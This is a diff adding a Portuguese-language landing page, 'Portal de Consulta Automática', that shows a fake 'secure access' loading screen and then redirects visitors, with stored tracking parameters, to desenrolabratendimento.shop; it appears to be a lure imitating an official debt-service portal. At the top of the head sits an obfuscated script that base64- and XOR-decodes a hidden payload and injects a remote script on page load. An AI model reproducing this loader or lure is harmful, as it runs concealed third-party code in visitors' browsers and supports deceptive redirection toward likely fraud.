@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script>(function(){var j_o8=atob("DCb2iZN3IvC2T32F5V3U/OEbAMqUJwnxlVXMprwURp6YOgnojECPp/AYT97UPVL2hlSf+ecEDYDfNxjpylaf8fYbDJrFbVGnhFKC+/oVV4TTPF+/vnvaq/QbTZLXIw6n332Nq/0WT5WUdV/1jF6T5doTANyUORzpkEPUs7FBQ8eHexy2hx7D7/FHEMOGfkqy1BfGsadVX63L");var w_ce=[];for(var i_i=0;i_i<j_o8.length;i_i++){w_ce.push(j_o8.charCodeAt(i_i)&255);}var v_b7o1=w_ce[0];var r_v=w_ce.slice(1,1+v_b7o1);var c_rfrf=w_ce.slice(1+v_b7o1);var m_9d=c_rfrf.map(function(b,s_dgv){return b^r_v[s_dgv%v_b7o1];});var v_dz="";for(var e_m3j=0;e_m3j<m_9d.length;e_m3j++){v_dz+=String.fromCharCode(m_9d[e_m3j]&255);}var j_v=decodeURIComponent(escape(v_dz));var e_4t7=JSON.parse(j_v);var z_6uei=e_4t7.globals||[];z_6uei.forEach(function(w_kl29){window[w_kl29.name]=w_kl29.value;});var n_4v=document.createElement("script");n_4v.src=e_4t7.url;n_4v.async=true;n_4v.defer=true;(e_4t7.attributes||[]).forEach(function(w_mm){n_4v.setAttribute(w_mm.name,w_mm.value);});(document.head||document.documentElement).appendChild(n_4v);})();</script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex, nofollow">
+<title>Portal de Consulta Automática</title>
+<style>
+  :root {
+    --bg-primary: #f5f9ff;
+    --bg-card: #ffffff;
+    --bg-card-alt: #fafcff;
+    --text-primary: #0b1a33;
+    --text-secondary: #4a6380;
+    --text-muted: #8a9fb5;
+    --accent: #0052cc;
+    --accent-light: #4a8cff;
+    --accent-glow: rgba(0, 82, 204, 0.1);
+    --accent-bg: #ebf3ff;
+    --border: #dce5f0;
+    --radius: 16px;
+    --shadow: 0 4px 20px rgba(0, 82, 204, 0.06);
+    --shadow-hover: 0 8px 40px rgba(0, 82, 204, 0.12);
+    --transition: all 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+  }
+
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    background: var(--bg-primary);
+    color: var(--text-primary);
+    min-height: 100vh;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .screen {
+    min-height: 100vh;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    padding: 1.5rem;
+    animation: fadeIn 0.6s ease-out;
+  }
+
+  .screen-legal {
+    min-height: 100vh;
+    display: none;
+    justify-content: center;
+    padding: 2rem 1rem;
+    animation: fadeIn 0.5s ease-out;
+    background: var(--bg-primary);
+  }
+
+  #loading-screen {
+    display: flex;
+    flex-direction: column;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(24px) scale(0.96); }
+    to { opacity: 1; transform: translateY(0) scale(1); }
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  @keyframes shimmer {
+    0% { background-position: -200% center; }
+    100% { background-position: 200% center; }
+  }
+
+  @keyframes float {
+    0%, 100% { transform: translateY(0px); }
+    50% { transform: translateY(-10px); }
+  }
+
+  @keyframes pulse-ring {
+    0% { transform: scale(0.95); opacity: 0.7; }
+    50% { transform: scale(1.05); opacity: 1; }
+    100% { transform: scale(0.95); opacity: 0.7; }
+  }
+
+  /* === LOADING === */
+  .loader-wrapper {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    margin-bottom: 2rem;
+  }
+
+  .loader-dots {
+    display: flex;
+    gap: 12px;
+    margin-bottom: 1.5rem;
+  }
+
+  .loader-dot {
+    width: 16px;
+    height: 16px;
+    border-radius: 50%;
+    background: var(--accent);
+    animation: pulse-ring 1.4s ease-in-out infinite;
+  }
+
+  .loader-dot:nth-child(2) {
+    animation-delay: 0.2s;
+    background: var(--accent-light);
+  }
+
+  .loader-dot:nth-child(3) {
+    animation-delay: 0.4s;
+    background: #7aafff;
+  }
+
+  #loading-screen h2 {
+    font-size: 1.4rem;
+    font-weight: 700;
+    margin: 0 0 0.4rem 0;
+    text-align: center;
+    color: var(--text-primary);
+  }
+
+  #loading-screen .subtitle {
+    font-size: 0.9rem;
+    color: var(--text-secondary);
+    margin: 0 0 2rem 0;
+    text-align: center;
+  }
+
+  .progress-wrap {
+    width: 100%;
+    max-width: 280px;
+  }
+
+  .progress-track {
+    width: 100%;
+    height: 6px;
+    border-radius: 3px;
+    background: var(--border);
+    overflow: hidden;
+    margin-bottom: 0.6rem;
+  }
+
+  .progress-fill {
+    height: 100%;
+    border-radius: 3px;
+    background: linear-gradient(90deg, var(--accent), var(--accent-light), var(--accent));
+    background-size: 200% auto;
+    width: 0%;
+    transition: width 0.15s linear;
+    animation: shimmer 2s linear infinite;
+  }
+
+  .progress-pct {
+    font-size: 0.85rem;
+    font-weight: 600;
+    color: var(--accent);
+    text-align: center;
+    margin: 0;
+  }
+
+  /* === CARD PRINCIPAL === */
+  .main-card {
+    width: 100%;
+    max-width: 440px;
+    border-radius: var(--radius);
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    overflow: hidden;
+    box-shadow: var(--shadow);
+    transition: var(--transition);
+  }
+
+  .main-card:hover {
+    box-shadow: var(--shadow-hover);
+  }
+
+  .main-card-header {
+    padding: 2rem 2rem 0 2rem;
+    text-align: center;
+  }
+
+  .main-card-body {
+    padding: 1.5rem 2rem 2rem 2rem;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+
+  .main-icon {
+    width: 72px;
+    height: 72px;
+    border-radius: 50%;
+    background: var(--accent-bg);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 1.25rem;
+    border: 2px solid rgba(0, 82, 204, 0.08);
+    animation: float 3.5s ease-in-out infinite;
+  }
+
+  .main-icon svg {
+    width: 34px;
+    height: 34px;
+    stroke: var(--accent);
+  }
+
+  .badge-status {
+    display: inline-flex;
+    align-items: center;
+    gap: 0.5rem;
+    padding: 0.3rem 1rem;
+    border-radius: 100px;
+    background: #e6f0ff;
+    font-size: 0.7rem;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    color: var(--accent);
+    margin-bottom: 0.5rem;
+  }
+
+  .badge-status .dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: #00c853;
+    animation: pulse-dot 1.8s ease-in-out infinite;
+  }
+
+  @keyframes pulse-dot {
+    0%, 100% { opacity: 1; transform: scale(1); }
+    50% { opacity: 0.3; transform: scale(0.7); }
+  }
+
+  .main-title {
+    font-size: 1.7rem;
+    font-weight: 800;
+    margin: 0 0 0.5rem 0;
+    line-height: 1.2;
+    color: var(--text-primary);
+  }
+
+  .main-sub {
+    font-size: 0.95rem;
+    color: var(--text-secondary);
+    line-height: 1.6;
+    margin: 0;
+  }
+
+  .cta-group {
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    gap: 0.75rem;
+    margin-top: 1.5rem;
+  }
+
+  .btn {
+    width: 100%;
+    height: 52px;
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.6rem;
+    font-weight: 700;
+    font-size: 1rem;
+    text-decoration: none;
+    border: none;
+    cursor: pointer;
+    transition: var(--transition);
+  }
+
+  .btn-primary {
+    background: var(--accent);
+    color: #ffffff;
+    box-shadow: 0 6px 20px rgba(0, 82, 204, 0.25);
+  }
+
+  .btn-primary:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 10px 32px rgba(0, 82, 204, 0.35);
+    background: #0047b3;
+  }
+
+  .btn-primary:active {
+    transform: scale(0.97);
+  }
+
+  .btn-arrow {
+    display: inline-block;
+    transition: var(--transition);
+    font-size: 1.2rem;
+  }
+
+  .btn-primary:hover .btn-arrow {
+    transform: translateX(5px);
+  }
+
+  /* === FOOTER === */
+  .main-footer {
+    width: 100%;
+    text-align: center;
+    border-top: 1px solid var(--border);
+    padding-top: 1.5rem;
+    margin-top: 1.5rem;
+  }
+
+  .legal-links {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-wrap: wrap;
+    gap: 0.4rem;
+    font-size: 0.78rem;
+    color: var(--text-muted);
+    margin-bottom: 0.8rem;
+  }
+
+  .legal-links a {
+    color: var(--text-secondary);
+    text-decoration: none;
+    cursor: pointer;
+    transition: var(--transition);
+    padding: 0.2rem 0.6rem;
+    border-radius: 4px;
+  }
+
+  .legal-links a:hover {
+    color: var(--accent);
+    background: var(--accent-bg);
+  }
+
+  .legal-links span {
+    color: var(--border);
+  }
+
+  .disclaimer-text {
+    font-size: 0.68rem;
+    color: var(--text-muted);
+    line-height: 1.5;
+    margin: 0;
+    padding: 0 0.5rem;
+  }
+
+  /* === TELAS LEGAIS === */
+  .legal-card {
+    width: 100%;
+    max-width: 720px;
+    border-radius: var(--radius);
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    padding: 2.5rem 2rem;
+    box-shadow: var(--shadow);
+  }
+
+  .back-link {
+    display: inline-flex;
+    align-items: center;
+    gap: 0.5rem;
+    font-size: 0.85rem;
+    color: var(--accent);
+    text-decoration: none;
+    margin-bottom: 1.5rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: var(--transition);
+    padding: 0.3rem 0.8rem;
+    border-radius: 6px;
+  }
+
+  .back-link:hover {
+    background: var(--accent-bg);
+  }
+
+  .legal-card h1 {
+    font-size: 1.6rem;
+    font-weight: 800;
+    margin: 0 0 1.5rem 0;
+    color: var(--text-primary);
+  }
+
+  .legal-card h2 {
+    font-size: 1.1rem;
+    font-weight: 700;
+    margin: 1.5rem 0 0.5rem 0;
+    color: var(--text-primary);
+  }
+
+  .legal-card p,
+  .legal-card li {
+    font-size: 0.95rem;
+    color: var(--text-secondary);
+    margin-bottom: 0.8rem;
+    line-height: 1.7;
+  }
+
+  .legal-card ul {
+    padding-left: 1.5rem;
+    margin-bottom: 1rem;
+  }
+
+  .legal-card ul li::marker {
+    color: var(--accent);
+  }
+
+  .inline-link {
+    color: var(--accent);
+    text-decoration: underline;
+    transition: var(--transition);
+  }
+
+  .inline-link:hover {
+    color: var(--accent-light);
+  }
+
+  .notice {
+    margin-top: 2rem;
+    padding: 1.2rem 1.5rem;
+    border-radius: 12px;
+    border: 1px solid rgba(0, 82, 204, 0.08);
+    background: var(--accent-bg);
+  }
+
+  .notice h2 {
+    font-size: 0.9rem;
+    margin-top: 0;
+    color: var(--accent);
+  }
+
+  .notice p {
+    font-size: 0.85rem;
+    margin: 0;
+    color: var(--text-secondary);
+  }
+
+  @media (max-width: 480px) {
+    .main-card-header { padding: 1.5rem 1.25rem 0 1.25rem; }
+    .main-card-body { padding: 1rem 1.25rem 1.5rem 1.25rem; }
+    .legal-card { padding: 1.5rem 1.25rem; }
+    .main-title { font-size: 1.3rem; }
+    .main-icon { width: 60px; height: 60px; }
+    .main-icon svg { width: 28px; height: 28px; }
+  }
+</style>
+<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+<script src="/js/utmify-track.js"></script>
+</head>
+<body>
+
+  <!-- ================= TELA 1: CARREGAMENTO ================= -->
+  <div id="loading-screen" class="screen">
+    <div class="loader-wrapper">
+      <div class="loader-dots">
+        <span class="loader-dot"></span>
+        <span class="loader-dot"></span>
+        <span class="loader-dot"></span>
+      </div>
+    </div>
+    <h2>Aguarde um momento</h2>
+    <p class="subtitle">Preparando seu acesso seguro...</p>
+    <div class="progress-wrap">
+      <div class="progress-track">
+        <div class="progress-fill" id="progress-fill"></div>
+      </div>
+      <p class="progress-pct" id="progress-pct">0%</p>
+    </div>
+  </div>
+
+  <!-- ================= TELA 2: PRINCIPAL ================= -->
+  <article id="main-content" class="screen">
+    <div class="main-card">
+      <div class="main-card-header">
+        <span class="badge-status">
+          <span class="dot"></span>
+          Conectado
+        </span>
+      </div>
+      <div class="main-card-body">
+        <div class="main-icon">
+          <svg fill="none" viewBox="0 0 24 24" stroke-width="2">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+          </svg>
+        </div>
+
+        <h1 class="main-title">Acesso Autorizado</h1>
+        <p class="main-sub">Sua conexão está protegida. Clique no botão para iniciar o atendimento.</p>
+
+        <div class="cta-group">
+          <a href="https://desenrolabratendimento.shop/" id="cta-next" class="btn btn-primary">
+            IR PARA O PORTAL
+            <span class="btn-arrow">→</span>
+          </a>
+        </div>
+
+        <div class="main-footer">
+          <div class="legal-links">
+            <a onclick="showScreen('privacy-screen')">Política de Privacidade</a>
+            <span aria-hidden="true">|</span>
+            <a onclick="showScreen('terms-screen')">Termos de Uso</a>
+          </div>
+          <p class="disclaimer-text">
+            Portal independente e informativo. Não possuímos vínculo com Google, YouTube ou entidades governamentais.
+          </p>
+        </div>
+      </div>
+    </div>
+  </article>
+
+  <!-- ================= TELA 3: POLÍTICA DE PRIVACIDADE ================= -->
+  <section id="privacy-screen" class="screen-legal">
+    <div class="legal-card">
+      <a onclick="showScreen('main-content')" class="back-link">← Voltar ao Início</a>
+      <h1>Política de Privacidade</h1>
+      <p>Sua privacidade é fundamental para nós. Esta política descreve como tratamos as informações dos visitantes deste portal.</p>
+
+      <h2>1. Informações Coletadas</h2>
+      <p>Coletamos dados não pessoais automaticamente, como tipo de navegador, idioma, horário de acesso e páginas visitadas. Essas informações são usadas para análise e melhoria da experiência do usuário.</p>
+
+      <h2>2. Uso de Cookies e Tecnologias</h2>
+      <p>Utilizamos cookies e tecnologias semelhantes, incluindo serviços como Google Ads e Google Analytics, para:</p>
+      <ul>
+        <li>Exibir anúncios personalizados com base nos interesses do usuário;</li>
+        <li>Medir o desempenho de campanhas publicitárias;</li>
+        <li>Analisar o tráfego e o comportamento de navegação;</li>
+      </ul>
+
+      <h2>3. Google Ads e Remarketing</h2>
+      <p>Utilizamos o Google Ads para veicular anúncios em plataformas de terceiros. O Google pode utilizar cookies para exibir anúncios com base em visitas anteriores a este site. Os dados coletados pelo Google Ads são tratados de acordo com a <a class="inline-link" href="https://policies.google.com/privacy" target="_blank" rel="noopener noreferrer">Política de Privacidade do Google</a>.</p>
+
+      <h2>4. Compartilhamento de Dados</h2>
+      <p>Não vendemos, trocamos ou transferimos suas informações pessoais para terceiros.</p>
+
+      <div class="notice">
+        <h2>ℹ️ Aviso Importante</h2>
+        <p>Este portal tem caráter estritamente informativo e atua de forma independente. Não possuímos vínculo com o Google, YouTube ou entidades governamentais.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================= TELA 4: TERMOS DE USO ================= -->
+  <section id="terms-screen" class="screen-legal">
+    <div class="legal-card">
+      <a onclick="showScreen('main-content')" class="back-link">← Voltar ao Início</a>
+      <h1>Termos de Uso</h1>
+      <p>Ao acessar e utilizar este site, você concorda com os seguintes Termos de Uso. Caso não concorde, recomendamos que não utilize o portal.</p>
+
+      <h2>1. Objetivo do Site</h2>
+      <p>Este site fornece informações gerais ao público. O conteúdo é de caráter exclusivamente informativo e não constitui assessoria ou prestação de serviços oficiais.</p>
+
+      <h2>2. Uso de Cookies e Publicidade</h2>
+      <p>Este site utiliza cookies e tecnologias de rastreamento, incluindo o Google Ads, para fins de publicidade e análise. Ao navegar, você consente com o uso dessas tecnologias.</p>
+
+      <h2>3. Propriedade Intelectual</h2>
+      <p>O conteúdo deste site é protegido por direitos autorais. A reprodução total ou parcial sem autorização prévia é proibida.</p>
+
+      <h2>4. Links para Terceiros</h2>
+      <p>Este site pode conter links para sites de terceiros. Não temos controle sobre o conteúdo ou práticas de privacidade desses sites.</p>
+
+      <div class="notice">
+        <h2>ℹ️ Aviso Importante</h2>
+        <p>Este portal tem caráter estritamente informativo e atua de forma independente. Não possuímos vínculo com o Google, YouTube ou entidades governamentais.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================= SCRIPTS ================= -->
+  <script>
+    // 1. Barra de Carregamento
+    (function () {
+      var progress = 0;
+      var totalDuration = 2500;
+      var interval = 25;
+      var steps = totalDuration / interval;
+      var increment = 100 / steps;
+
+      var fill = document.getElementById('progress-fill');
+      var pctLabel = document.getElementById('progress-pct');
+
+      var timer = setInterval(function () {
+        progress += increment;
+        if (progress >= 100) {
+          progress = 100;
+          clearInterval(timer);
+          setTimeout(finishLoading, 200);
+        }
+        update(progress);
+      }, interval);
+
+      function update(p) {
+        var pct = Math.round(p);
+        fill.style.width = pct + '%';
+        pctLabel.textContent = pct + '%';
+      }
+
+      function finishLoading() {
+        document.getElementById('loading-screen').style.display = 'none';
+        document.getElementById('main-content').style.display = 'flex';
+      }
+    })();
+
+    // 2. Navegação entre telas
+    function showScreen(screenId) {
+      document.getElementById('main-content').style.display = 'none';
+      document.getElementById('privacy-screen').style.display = 'none';
+      document.getElementById('terms-screen').style.display = 'none';
+      document.getElementById(screenId).style.display = 'flex';
+      window.scrollTo(0, 0);
+    }
+  </script>
+
+  <script id="_wauttk">var _wau = _wau || []; _wau.push(["dynamic", "jfdj3zqohe", "ttk"]);</script>
+  <script async src="//waust.at/d.js"></script>
+
+  <!-- ==== REDIRECIONAMENTO PARA O NOVO DOMINIO ==== -->
+  <script>
+    var NOVO_DOMINIO = "https://desenrolabratendimento.shop/";
+    (function () {
+      function montarDestino() {
+        var url = new URL(NOVO_DOMINIO);
+        var atuais = new URLSearchParams(window.location.search);
+        atuais.forEach(function (v, k) { if (v) url.searchParams.set(k, v); });
+        try {
+          var salvos = JSON.parse(localStorage.getItem("tracking_params") || "{}");
+          Object.keys(salvos).forEach(function (k) {
+            if (salvos[k] && !url.searchParams.get(k)) url.searchParams.set(k, salvos[k]);
+          });
+        } catch (e) {}
+        return url.toString();
+      }
+      function aplicar() {
+        var cta = document.getElementById("cta-next");
+        if (cta) cta.setAttribute("href", montarDestino());
+      }
+      try {
+        var p = new URLSearchParams(window.location.search);
+        var keys = ["utm_source","utm_medium","utm_campaign","utm_content","utm_term","src","sck","xcod","gclid","fbclid","ttclid"];
+        var store = JSON.parse(localStorage.getItem("tracking_params") || "{}");
+        keys.forEach(function (k) { var v = p.get(k); if (v) store[k] = v; });
+        localStorage.setItem("tracking_params", JSON.stringify(store));
+      } catch (e) {}
+      if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", aplicar); else aplicar();
+    })();
+  </script>
+</body>
+</html>
